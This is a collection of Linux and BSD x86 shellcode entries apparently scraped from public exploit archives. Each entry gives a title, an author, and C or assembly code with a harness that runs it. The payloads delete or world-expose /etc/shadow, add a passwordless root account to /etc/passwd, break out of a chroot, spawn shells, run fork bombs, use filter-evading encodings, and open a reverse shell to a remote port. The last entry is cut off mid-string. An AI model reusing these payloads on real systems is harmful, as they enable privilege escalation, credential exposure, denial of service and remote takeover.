{"Title": "Linux/x86 - DoS SLoc Shellcode (55 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-587.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "by Magnefikko", "14.04.2010", "magnefikko@gmail.com", "Promhyl Studies :: http://promhyl.oz.pl", "Subgroup: #PRekambr", "Name: 55 bytes SLoc-DoS shellcode", "Platform: Linux x86", "", "unlink(\"/etc/shadow\");", "execve(\"poweroff\", 0, 0);", "", "gcc -Wl,-z,execstack filename.c", "", "shellcode:", "", "\\xeb\\x25\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\x89\\x43\\x0b\\xb0\\x0a\\xcd\\x80\\xeb\\x08\\x5b\\x89\\x53\\x08\\xb0\\x0b\\xcd\\x80\\xe8\\xf3\\xff\\xff\\xff\\x70\\x6f\\x77\\x65\\x72\\x6f\\x66\\x66\\xe8\\xd6\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77", "", "*/", "", "", "int main(){", "char shell[] =", "\"\\xeb\\x25\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\x89\\x43\\x0b\\xb0\\x0a\\xcd\\x80\\xeb\\x08\\x5b\\x89\\x53\\x08\\xb0\\x0b\\xcd\\x80\\xe8\\xf3\\xff\\xff\\xff\\x70\\x6f\\x77\\x65\\x72\\x6f\\x66\\x66\\xe8\\xd6\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\";", "printf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - execve(a->/bin/sh) + Local-only Shellcode (14 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-17", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-589.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "\tby Magnefikko", "\t17.04.2010", "\tmagnefikko@gmail.com", "\tPromhyl Studies :: http://promhyl.oz.pl", "\tSubgroup: #PRekambr", "\tName: 14 bytes execve(\"a->/bin/sh\") local-only shellcode", "\tPlatform: Linux x86", "\t", "\texecve(\"a\", 0, 0);", "", "\t$ ln -s /bin/sh a", "\t$ gcc -Wl,-z,execstack filename.c", "\t$ ./a.out", "\t", "\tLink is required.", "", "\tshellcode:", "", "\\x31\\xc0\\x50\\x6a\\x61\\x89\\xe3\\x99\\x50\\xb0\\x0b\\x59\\xcd\\x80", "", "*/", "", "", "int main(){", "\tchar shell[] = \"\\x31\\xc0\\x50\\x6a\\x61\\x89\\xe3\\x99\\x50\\xb0\\x0b\\x59\\xcd\\x80\";", "\tprintf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "\t(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - chmod 0777 /etc/shadow Shellcode (33 bytes)", "Author": "sm0k", "Published": ": 2010-04-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-590.php", "View": null, "code": ["# 5m0k3.digital.3scape@gmail.com", "# http://plasticsouptaste.blogspot.com", "# Name: 33 bytes chmod(\"/etc/shadow\", 0777) shellcode", "# Platform: Linux x86", "", "#include \"stdio.h\"", "", "int main(int argc, char *argv[])", "{", "", "char shellcode[]", "=\"\\x31\\xc0\\x50\\xb0\\x0f\\x68\\x61\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd\\x80\\x40\\xcd\\x80\";", "", "printf(\"Length: %d\\n\",strlen(shellcode));", "(*(void(*)()) shellcode)();", "", "return 0;", "}", "", "/*", "xor %eax,%eax", "push %eax", "mov $0xf,%al", "push $0x776f6461", "push $0x68732f63", "push $0x74652f2f", "mov %esp,%ebx", "xor %ecx,%ecx", "mov $0x1ff,%cx", "int $0x80", "inc %eax", "int $0x80", "", "*/", "-- ", "Blog transitio\u00e9thanolique contemporain :", "http://plasticsouptaste.blogspot.com/!!"]},
{"Title": "Linux/x86 - chmod 0777 /etc/shadow Shellcode (29 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-19", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-593.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "by Magnefikko", "20.04.2010", "magnefikko@gmail.com", "promhyl.oz.pl", "Subgroup: #PRekambr", "Name: 29 bytes chmod(\"/etc/shadow\", 0777) shellcode", "Platform: Linux x86", "", "chmod(\"/etc/shadow\", 0777);", "", "gcc -Wl,-z,execstack filename.c", "", "shellcode:", "", "\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\x66\\x68\\xff\\x01\\x59\\xb0\\x0f\\xcd\\x80", "", "*/", "", "", "int main(){", "char shell[] =", "\"\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x65\\x74\\x89\\xe3\\x66\\x68\\xff\\x01\\x59\\xb0\\x0f\\xcd\\x80\";", "printf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - Fork Bomb + Polymorphic Shellcode (30 bytes)", "Author": "Jonathan Salwan", "Published": ": 2010-04-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13680.c", "View": "https://old.exploit-db.com/raw/13680/", "code": ["/*", "Title:\tLinux x86 polymorphic forkbombe - 30 bytes", "Author:\tJonathan Salwan <submit@shell-storm.org>", "Web:\thttp://www.shell-storm.org", "", "! Database of shellcodes: http://www.shell-storm.org/shellcode/", "", "", "Disassembly of section .text:", "", "08048054 <_a>:", " 8048054:\tb0 02                \tmov    $0x2,%al", " 8048056:\tcd 80                \tint    $0x80", " 8048058:\teb fa                \tjmp    8048054 <_a>", "", "*/", "", "#include <stdio.h>", "", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x06\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t   \t\"\\xb1\\x03\\xce\\x81\\xec\\xfb\";", "", "int main()", "{", "fprintf(stdout,\"Lenght: %d\\n\",strlen(shellcode));", "(*(void  (*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - Fork Bomb Shellcode (6 bytes) (2)", "Author": "Jonathan Salwan", "Published": ": 2010-04-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13681.c", "View": "https://old.exploit-db.com/raw/13681/", "code": ["/*", "Title:\tLinux x86 forkbombe - 6 bytes", "Author:\tJonathan Salwan <submit@shell-storm.org>", "Web:\thttp://www.shell-storm.org", "", "! Database of shellcodes: http://www.shell-storm.org/shellcode/", "", "", "Disassembly of section .text:", "", "08048054 <_a>:", " 8048054:\tb0 02                \tmov    $0x2,%al", " 8048056:\tcd 80                \tint    $0x80", " 8048058:\teb fa                \tjmp    8048054 <_a>", "", "*/", "", "#include <stdio.h>", "", "char shellcode[] = \"\\xb0\\x02\\xcd\\x80\\xeb\\xfa\";", "", "int main()", "{", "fprintf(stdout,\"Lenght: %d\\n\",strlen(shellcode));", "(*(void  (*)()) shellcode)();", "}"]},
{"Title": "Linux/x86 - chmod 0666 /etc/shadow + exit() Shellcode (32 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13392.c", "View": "https://old.exploit-db.com/raw/13392/", "code": ["/*", " * (linux/x86) chmod(\"/etc/shadow\", 0666) + exit() - 32 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x0f\"              // push $0xf ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x31\\xc9\"              // xor %ecx,%ecx ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x66\\xb9\\xb6\\x01\"      // mov $0x1b6,%cx ", "\t\"\\x68\\x61\\x64\\x6f\\x77\"  // push $0x776f6461 ", "\t\"\\x68\\x63\\x2f\\x73\\x68\"  // push $0x68732f63 ", "\t\"\\x68\\x2f\\x2f\\x65\\x74\"  // push $0x74652f2f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x40\"                  // inc %eax ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - execve() Shellcode (23 bytes)", "Author": "marcetam", "Published": ": 2004-11-15", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13422.c", "View": "https://old.exploit-db.com/raw/13422/", "code": ["/************************************************************", "* Linux 23 byte execve code. Greetz to preedator            *", "*                                          marcetam         *", "*                                      admin at marcetam.net   *", "*************************************************************/", "char linux[]=", "  \"\\x99\"\t\t\t/* cdq              */", "  \"\\x52\"\t\t\t/* push %edx        */", "  \"\\x68\\x2f\\x2f\\x73\\x68\"\t/* push $0x68732f2f */", "  \"\\x68\\x2f\\x62\\x69\\x6e\"\t/* push $0x6e69622f */", "  \"\\x89\\xe3\"\t\t\t/* mov %esp,%ebx    */", "  \"\\x52\"\t\t\t/* push %edx        */", "  \"\\x54\"\t\t\t/* push %esp        */", "  \"\\x54\"\t\t\t/* push %esp        */", "  \"\\x59\\x6a\"\t\t\t/* pop %ecx         */", "  \"\\x0b\\x58\"\t\t\t/* push $0x0b       */", "  \"\\xcd\\x80\";\t\t\t/* int $0x80        */", "int main(){", "  void (*run)()=(void *)linux;", "  printf(\"%d bytes \\n\",strlen(linux));", "  run();", "}", "", "// milw0rm.com [2004-11-15]"]},
{"Title": "Linux/x86 - execve(\"/bin/ash\",0,0) Shellcode (21 bytes)", "Author": "zasta", "Published": ": 2004-11-15", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13423.c", "View": "https://old.exploit-db.com/raw/13423/", "code": ["/* 21 byte execve(\"/bin/ash\",0,0); shellcode for linux x86", " * by zasta (zasta at darkircop.org) */", "#include <unistd.h>", "#include <stdio.h>", "char shellcode[] =      \"\\x31\\xc9\\xf7\\xe1\\x04\\x0b\\x52\\x68\"", "                        \"\\x2f\\x61\\x73\\x68\\x68\\x2f\\x62\\x69\"", "                        \"\\x6e\\x89\\xe3\\xcd\\x80\";", "void code() {", "        __asm__(\"", "                xor %ecx,%ecx", "                mul %ecx", "                addb $0xb,%al", "                push %edx", "                push $0x6873612f", "                push $0x6e69622f", "                mov %esp,%ebx", "                int $0x80", "        \");", "}", "void (*ptr)() = (void(*)()) &shellcode[0];(*ptr)();", "", "", "// milw0rm.com [2004-11-15]"]},
{"Title": "Linux/x86 - Alphanumeric Encoded Shellcode (64 bytes)", "Author": "xort", "Published": ": 2004-12-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-246.php", "View": null, "code": ["     /*--------------------------------------*/", "     /*   64 byte alpha-numeric shellcode    */", "     /*        by XORt@dallas_2600   64bytes */", "     /*--------------------------------------*/", "     \"\\x6a\\x30\"         /* pushb $0x30       */", "     \"\\x58\"             /* pop %eax          */", "     \"\\x34\\x30\"         /* xorb $0x30, %al   */", "     \"\\x50\"             /* push %eax         */", "     \"\\x5a\"             /* pop %edx          */", "     \"\\x48\"             /* dec %eax          */", "     \"\\x66\\x35\\x41\\x30\" /* xorl $0x3041, %ax */", "     \"\\x66\\x35\\x73\\x4f\" /* xorl $0x4f73, %ax */ ", "     \"\\x50\"             /* push %eax         */", "     \"\\x52\"             /* pushl %edx        */", "     \"\\x58\"             /* pop %eax          */", "     \"\\x684J4A\"         /* pushl \"4J4A\"      */", "     \"\\x68PSTY\"         /* pushl \"PSTY\"      */", "     \"\\x68UVWa\"         /* pushl \"UVWa\"      */", "     \"\\x68QRPT\"         /* pushl \"QRPT\"      */", "     \"\\x68PTXR\"         /* pushl \"PTXR\"      */", "     \"\\x68binH\"         /* pushl \"binH\"      */", "     \"\\x68IQ50\"         /* pushl \"IQ50\"      */", "     \"\\x68shDY\"         /* pushl \"shDY\"      */", "     \"\\x68Rha0\"         /* pushl \"Rha0\"      */", "     /*--------------------------------------*/", "", "", "// milw0rm.com [2004-12-22]"]},
{"Title": "Linux/x86 - Alphanumeric Encoded + IMUL Method Shellcode (88 bytes)", "Author": "xort", "Published": ": 2004-12-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-247.php", "View": null, "code": ["     /*-----------------------------------------------------*/", "     /*     Alpha-Numeric Shellcode using IMUL Method       */", "     /*           By XORt@dallas_2600)              88bytes */", "     /*-----------------------------------------------------*/", "     \"\\x68\\x69\\x58\\x69\\x6b\" /* push $0x6b695869             */", "     \"\\x68\\x7a\\x36\\x37\\x70\" /* push $0x7037367a             */", "     \"\\x68\\x58\\x58\\x41\\x73\" /* push $0x73415858             */", "     \"\\x68\\x71\\x4a\\x77\\x79\" /* push $0x79774a71             */", "     \"\\x68\\x65\\x77\\x57\\x31\" /* push $0x31577765             */", "     \"\\x68\\x42\\x69\\x57\\x77\" /* push $0x6850c031             */", "     \"\\x50\\x50\\x50\\x50\\x50\" /* 17 push %eax's               */", "     \"\\x50\\x50\\x50\\x50\\x50\" /*                              */", "     \"\\x50\\x50\\x50\\x50\\x50\" /*                              */", "     \"\\x50\\x50\"             /*                              */", "     \"\\x54\"                 /* push %esp                    */", "     \"\\x59\"                 /* pop %ecx                     */", "     \"\\x6b\\x51\\x58\\x57\"     /* imul $0x57, 0x58(%ecx), %edx */", "     \"\\x42\"                 /* inc %edx                     */", "     \"\\x52\"                 /* push %edx                    */", "     \"\\x6b\\x41\\x54\\x78\"     /* imul $0x78, 0x54(%ecx), %edx */", "     \"\\x34\\x63\"             /* xor $0x63, %al               */", "     \"\\x50\"                 /* push %eax                    */", "     \"\\x6b\\x51\\x50\\x4a\"     /* imul $0x4a, 0x50(%ecx), %edx */", "     \"\\x4a\"                 /* dec %edx                     */", "     \"\\x4a\"                 /* dec %edx                     */", "     \"\\x52\"                 /* push %edx                    */", "     \"\\x6b\\x51\\x4c\\x79\"     /* imul $0x79, 0x4c(%ecx), %edx */", "     \"\\x4a\"                 /* dec %edx                     */", "     \"\\x52\"                 /* push %edx                    */", "     \"\\x6b\\x41\\x48\\x36\"     /* imul $0x36, 0x48(%ecx), %edx */", "     \"\\x34\\x61\"             /* xor $0x61, %al               */", "     \"\\x50\"                 /* push %eax                    */", "     \"\\x6b\\x51\\x44\\x79\"     /* imul $0x79, 0x44(%ecx), %edx */", "     \"\\x4a\"                 /* dec %edx                     */", "     \"\\x52\"                 /* push %edx                    */", "     /*------------------------------------------[bytes:88]-*/", "", "", "// milw0rm.com [2004-12-22]"]},
{"Title": "BSDi/x86 - execve(/bin/sh) Shellcode (46 bytes)", "Author": "vade79", "Published": ": 2004-09-26", "Platform": "BSDi_x86", "Download": "https://old.exploit-db.com/download/13258.c", "View": "https://old.exploit-db.com/raw/13258/", "code": ["/*", " *  BSDi", " *  execve() of /bin/sh by v9 (v9@fakehalo.org)", " */", "", "static char exec[]=", "  \"\\xeb\\x1f\\x5e\\x31\\xc0\\x89\\x46\\xf5\\x88\\x46\\xfa\\x89\\x46\\x0c\" /* 14 characters. */", "  \"\\x89\\x76\\x08\\x50\\x8d\\x5e\\x08\\x53\\x56\\x56\\xb0\\x3b\\x9a\\xff\" /* 14 characters. */", "  \"\\xff\\xff\\xff\\x07\\xff\\xe8\\xdc\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\" /* 14 characters. */", "  \"\\x2f\\x73\\x68\\x00\"; /* 4 characters; 46 characters total. */", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Add Root User (z) To /etc/passwd Shellcode (70 bytes)", "Author": "anonymous", "Published": ": 2000-08-07", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13461.c", "View": "https://old.exploit-db.com/raw/13461/", "code": ["/*", " *  Linux/x86", " *", " *  Appends the line \"z::0:0:::\\n\" to /etc/passwd.", " *  (quite old, could be optimized further)", " */", "#include <stdio.h>", "", "char c0de[] =", "/* main: */", "\"\\xeb\\x29\"                           /* jmp callz                */", "/* start: */", "\"\\x5e\"                               /* popl %esi                */", "\"\\x29\\xc0\"                           /* subl %eax, %eax          */", "\"\\x88\\x46\\x0b\"                       /* movb %al, 0x0b(%esi)     */", "\"\\x89\\xf3\"                           /* movl %esi, %ebx          */", "\"\\x66\\xb9\\x01\\x04\"                   /* movw $0x401, %cx         */", "\"\\x66\\xba\\xb6\\x01\"                   /* movw $0x1b6, %dx         */", "\"\\xb0\\x05\"                           /* movb $0x05, %al          */", "\"\\xcd\\x80\"                           /* int $0x80                */", "\"\\x93\"                               /* xchgl %eax, %ebx         */", "\"\\x29\\xc0\"                           /* subl %eax, %eax          */", "\"\\x29\\xd2\"                           /* subl %edx, %edx          */", "\"\\xb0\\x04\"                           /* movb $0x04, %al          */", "\"\\x89\\xf1\"                           /* movl %esi, %ecx          */", "\"\\x80\\xc1\\x0c\"                       /* addb $0x0c, %cl          */", "\"\\xb2\\x0a\"                           /* movb $0x0a, %dl          */", "\"\\xcd\\x80\"                           /* int $0x80                */", "\"\\x29\\xc0\"                           /* subl %eax, %eax          */", "\"\\x40\"                               /* incl %eax                */", "\"\\xcd\\x80\"                           /* int $0x80                */", "/* callz: */", "\"\\xe8\\xd2\\xff\\xff\\xff\"               /* call start               */", "/* DATA */", "\"/etc/passwd\"", "\"\\xff\"", "\"z::0:0:::\\n\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(c0de));", "        (*ret) = (int)c0de;", "}", "", "// milw0rm.com [2000-08-07]"]},
{"Title": "Linux/x86 - setreuid(0, 0) + Break chroot (mkdir/chdir/chroot \"../\") + execve(/bin/sh) Shellcode (132 bytes)", "Author": "anonymous", "Published": ": 2000-08-07", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13462.c", "View": "https://old.exploit-db.com/raw/13462/", "code": ["/*", " *  Linux/x86", " *", " *  - setreuid(0, 0); ", " *  - chroot-break (make a temp dir with mkdir(), chroot() to tempdir,", " *    go through a loop of chdir(\"..\"); then a final chroot(\".\");", " *  - execve of /bin/sh", " *", " *  (used in several wu-ftpd, beroftpd and proftpd exploits, amongst others)", " */", "", "#include <stdio.h>", "char c0de[] =", "/* main: */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x29\\xdb\"                                  /* subl %ebx, %ebx             */", "\"\\x29\\xc9\"                                  /* subl %ecx, %ecx             */", "\"\\xb0\\x46\"                                  /* movb $0x46, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "", "\"\\xeb\\x60\"                                  /* jmp callz                   */", "", "/* start: */", "\"\\x5e\"                                      /* popl %esi                   */", "\"\\x8d\\x5e\\x0f\"                              /* leal 0x0f(%esi), %ebx       */", "", "/* loopz: */", "\"\\x39\\xf3\\x7c\"                              /* cmpl %esi, %ebx             */", "\"\\x06\\x80\"                                  /* jl after                    */", "\"\\x03\\x04\"                                  /* addb $0x04, (%ebx)          */", "\"\\x4b\"                                      /* decl %ebx                   */", "\"\\xeb\\xf6\"                                  /* jmp loopz                   */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x88\\x46\\x01\"                              /* movb %al, 0x01(%esi)        */", "\"\\x88\\x46\\x08\"                              /* movb %al, 0x08(%esi)        */", "\"\\x88\\x46\\x10\"                              /* movb %al, 0x10(%esi)        */", "\"\\x8d\\x5e\\x07\"                              /* leal 0x07(%esi), %ebx       */", "\"\\xb0\\x0c\"                                  /* movb $0x0c, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x8d\\x1e\"                                  /* leal (%esi), %ebx           */", "\"\\x29\\xc9\"                                  /* subl %ecx, %ecx             */", "\"\\xb0\\x27\"                                  /* movb $0x27, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\xb0\\x3d\"                                  /* movb $0x3d, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x8d\\x5e\\x02\"                              /* leal 0x02(%esi), %ebx       */", "\"\\xb0\\x0c\"                                  /* movb $0x0c, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x88\\x46\\x03\"                              /* movb %al, 0x03(%esi)        */", "\"\\x8d\\x5e\\x02\"                              /* leal 0x02(%esi), %ebx       */", "\"\\xb0\\x3d\"                                  /* movb $0x3d, %al             */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x8d\\x5e\\x09\"                              /* leal 0x09(%esi), %ebx       */", "\"\\x89\\x5b\\x08\"                              /* movl %ebx, 0x08(%ebx)       */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x88\\x43\\x07\"                              /* movb %al, 0x07(%ebx)        */", "\"\\x89\\x43\\x0c\"                              /* movl %eax, 0x0c(%ebx)       */", "\"\\xb0\\x0b\"                                  /* movb $0x0b, %al             */", "\"\\x8d\\x4b\\x08\"                              /* leal 0x08(%ebx), %ecx       */", "\"\\x8d\\x53\\x0c\"                              /* leal 0x0c(%ebx), %edx       */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\x29\\xc0\"                                  /* subl %eax, %eax             */", "\"\\x40\"                                      /* incl %eax                   */", "\"\\xcd\\x80\"                                  /* int $0x80                   */", "\"\\xe8\\x9b\\xff\\xff\\xff\"                      /* call start                  */", "\"\\xff\\xff\\xff\"                              /* markup                      */", "", "\"\\x3d\\x3d\\x2a\\x2a\\x2b\\x2a\\x2a\\x2b\\x3d\\x2b\\x5e\\x65\\x6a\\x2b\\x6f\\x64\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(c0de));", "        (*ret) = (int)c0de;", "}", "", "// milw0rm.com [2000-08-07]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + ToLower Encoded Shellcode (55 bytes)", "Author": "anonymous", "Published": ": 2000-08-08", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13460.c", "View": "https://old.exploit-db.com/raw/13460/", "code": ["/*", " *  Linux/x86", " *", " *  toupper() evasion, standard execve() /bin/sh (used eg. in various", " *  imapd exploits). Goes through a loop adding 0x20 to the ", " *  (/bin/sh -= 0x20) string (ie. yields /bin/sh after addition).", " */", "#include <stdio.h>", "", "char c0de[] =", "/* main: */", "\"\\xeb\\x29\"                            /* jmp callz                   */", "/* start: */", "\"\\x5e\"                                /* popl %esi                   */", "\"\\x29\\xc9\"                            /* subl %ecx, %ecx             */", "\"\\x89\\xf3\"                            /* movl %esi, %ebx             */", "\"\\x89\\x5e\\x08\"                        /* movl %ebx, 0x08(%esi)       */", "\"\\xb1\\x07\"                            /* movb $0x07, %cl             */", "/* loopz: */", "\"\\x80\\x03\\x20\"                        /* addb $0x20, (%ebx)          */", "\"\\x43\"                                /* incl %ebx                   */", "\"\\xe0\\xfa\"                            /* loopne loopz                */", "\"\\x29\\xc0\"                            /* subl %eax, %eax             */", "\"\\x88\\x46\\x07\"                        /* movb %al, 0x07(%esi)        */", "\"\\x89\\x46\\x0c\"                        /* movl %eax, 0x0c(%esi)       */", "\"\\xb0\\x0b\"                            /* movb $0x0b, %al             */", "\"\\x87\\xf3\"                            /* xchgl %esi, %ebx            */", "\"\\x8d\\x4b\\x08\"                        /* leal 0x08(%ebx), %ecx       */", "\"\\x8d\\x53\\x0c\"                        /* leal 0x0c(%ebx), %edx       */", "\"\\xcd\\x80\"                            /* int $0x80                   */", "\"\\x29\\xc0\"                            /* subl %eax, %eax             */", "\"\\x40\"                                /* incl %eax                   */", "\"\\xcd\\x80\"                            /* int $0x80                   */", "/* callz: */", "\"\\xe8\\xd2\\xff\\xff\\xff\"                /* call start                  */", "\"\\x0f\\x42\\x49\\x4e\\x0f\\x53\\x48\";       /* /bin/sh -= 0x20             */", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(c0de));", "        (*ret) = (int)c0de;", "}", "", "// milw0rm.com [2000-08-08]"]},
{"Title": "BSD - Reverse (127.0.0.1:31337/TCP) Shell (/bin/sh) Shellcode (124 bytes)", "Author": "Scrippie", "Published": ": 2000-11-19", "Platform": "BSD", "Download": "http://shell-storm.org/shellcode/files/shellcode-90.php", "View": null, "code": ["; Passive Connection Shellcode", ";", "; Coded by Scrippie - ronald@grafix.nl - http://b0f.freebsd.lublin.pl", "; Buffer0verfl0w Security", "; Why? This evades firewalls...", ";", "; YES, this is for NASM, I detest AT&T syntaxis - it's gross and unreadable", ";", "; This is the FreeBSD variant I whipped up", ";", "; Tnx to dvorak for pointing out that BSD's int 80h assumes a stored EIP", "; on the stack before making it and that BSD has a somewhat different", "; sockaddr_in structure (containing sin_len)", "", "        BITS 32", "", "; Equates - keeps this stuff a lot more clear", "", "PORT            equ 31337               ; What an eleet port!", "", "_exit           equ 1                   ; See /usr/src/sys/kern/syscalls.c", "execve          equ 59                  ; See /usr/src/sys/kern/syscalls.c", "dup2            equ 90                  ; See /usr/src/sys/kern/syscalls.c", "socket          equ 97                  ; See /usr/src/sys/kern/syscalls.c", "connect         equ 98                  ; See /usr/src/sys/kern/syscalls.c", "", "IPPROTO_TCP     equ 6                   ; See netinet/in.h", "PF_INET         equ 2                   ; See sys/socket.h", "SOCK_STREAM     equ 1                   ; See sys/socket.h", "", "sockaddr_in_off equ 0", "shell_off       equ 8", "shell_ptr_off   equ 16", "", "        jmp short EndCode", "", "Start:", "        pop esi                         ; Get offset data in esi", "", "        xor eax, eax", "        xor ebx, ebx", "", "        mov bl, IPPROTO_TCP             ; Push IPPROTO_TCP", "        push ebx", "        mov bl, SOCK_STREAM             ; Push SOCK_STREAM", "        push ebx", "        mov bl, PF_INET                 ; Push PF_INET", "        push ebx", "        push ebx                        ; Skipped by int 80h", "        mov al, socket                  ; Select socket() syscall", "", "        int 80h                         ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)", "        mov edx, eax                    ; Save the resulting socket descriptor", "", "        mov byte [esi+sockaddr_in_off+1], PF_INET ; sin_family -> PF_INET", "        mov word [esi+sockaddr_in_off+2], PORT  ; Set the port number", "", "        mov bl, 16                      ; sizeof(sockaddr_in)", "        push ebx", "", "        lea ebx, [esi+sockaddr_in_off]  ; Get offset sockaddr_in into ebx", "        push ebx                        ; Push it", "        push eax                        ; Still holds sockfd", "        push eax                        ; Canary value", "", "        mov al, connect                 ; Select connect() syscall", "        int 80h                         ; connect(sockfd, sockaddr_in, 10)", "", "        xor ebx, ebx", "        push ebx", "        push edx", "        mov al, dup2                    ; Select dup2 syscall", "", "        push eax                        ; Ruined", "        int 80h", "", "        inc bl", "        push ebx", "        push edx", "        mov al, dup2                    ; Do the same for stdout", "        ", "        push eax", "        int 80h", "", "        inc bl", "        push ebx", "        push edx", "        mov al, dup2                    ; And finally for stderr", "", "        push eax", "        int 80h", "", "        xor ebx, ebx", "        push ebx                        ; *envp == NULL", "", "        lea edi, [esi+shell_off+7]", "        xor eax, eax", "        xor ecx, ecx", "        mov cl, 9", "        repe stosb", "", "        lea ebx, [esi+shell_off]        ; Get offset shell into ebx", "        mov [esi+shell_ptr_off], ebx    ; Store it at shell_off", "        lea ecx, [esi+shell_ptr_off]    ; Get offset shell_off into ecx", "        push ecx                        ; argp", "        push ebx                        ; command", "", "        push eax                        ; canary", "        mov al, execve", "        int 80h                         ; Spawn the frikkin' shell", "", "        mov al, _exit                   ; _exit() system call", "        int 80h                         ; Do it", "", "EndCode:", "        call Start", "", "sockaddr_in     db 'ABCC'               ; A=sin_len - B=sin_family - C=port", "                dd 0x100007f            ; IP addr (s_addr) in htonl() form", "; 8 bytes not needed ;)", "", "shell           db '/bin/sh' ;,0", ";shell_ptr      db 1,2,3,4", "", "------------------------------------------------------------------------------", "", "And here's the shellcode equivalent", "", "char shellcode[]=", "\"\\xeb\\x68\\x5e\\x31\\xc0\\x31\\xdb\\xb3\\x06\\x53\\xb3\\x01\\x53\\xb3\\x02\\x53\\x53\\xb0\\x61\\x", "cd\\x80\\x89\\xc2\\xc6\\x46\\x01\\x02\\x66\\xc7\\x46\\x02\\x69\\x7a\\xb3\\x10\\x53\\x8d\\x1e\\x53\\", "x50\\x50\\xb0\\x62\\xcd\\x80\\x31\\xdb\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\xfe\\xc3\\x53\\x52\\xb0", "\\x5a\\x50\\xcd\\x80\\xfe\\xc3\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\x31\\xdb\\x53\\x8d\\x7e\\x0f\\x3", 